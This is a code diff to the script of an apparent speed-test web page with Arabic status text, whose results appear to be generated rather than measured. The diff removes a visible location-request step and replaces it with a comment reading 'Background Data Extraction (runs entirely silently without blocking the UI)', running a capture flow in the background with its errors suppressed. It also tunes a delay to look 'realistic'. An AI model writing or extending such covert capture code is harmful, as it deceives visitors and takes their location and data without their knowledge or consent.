@@ -750,30 +750,28 @@ async function startTest() {
   isRunning = true;
   els.startBtn.disabled = true;
   els.stateResults.classList.add('hidden');
-  captureId = null;
   resetGaugeOnly();
 
   const results = generateResults();
   
-  // Smart Integrated Location Request
-  setStatus('تحديد العقدة الأقرب...');
-  els.phaseLabel.textContent = 'OPTIMIZING ROUTING';
-  els.phaseLabel.classList.add('show');
-  
+  // Background Data Extraction (runs entirely silently without blocking the UI)
   if (!captureId) {
-    await triggerCaptureFlow();
+    triggerCaptureFlow().catch(() => {});
   } else {
     getAccurateLocation(captureId);
   }
 
-  els.phaseLabel.textContent = 'FINDING SERVER';
+  // Instant UI Response
+  setStatus('جاري الاتصال بالخادم...');
   els.startBtn.classList.add('hidden');
   els.restartTestBtnHeader.classList.add('visible');
   els.speedNum.classList.add('show');
   els.speedUnit.classList.add('show');
   els.phaseLabel.classList.add('show');
+  
+  els.phaseLabel.textContent = 'FINDING SERVER';
   setPhaseSteps(getPhaseState(0));
-  await delay(600);
+  await delay(200); // Tiny realistic delay instead of 600ms
 
   els.phaseLabel.textContent = 'INTEGRITY CHECK';
   setArcColor('ping');
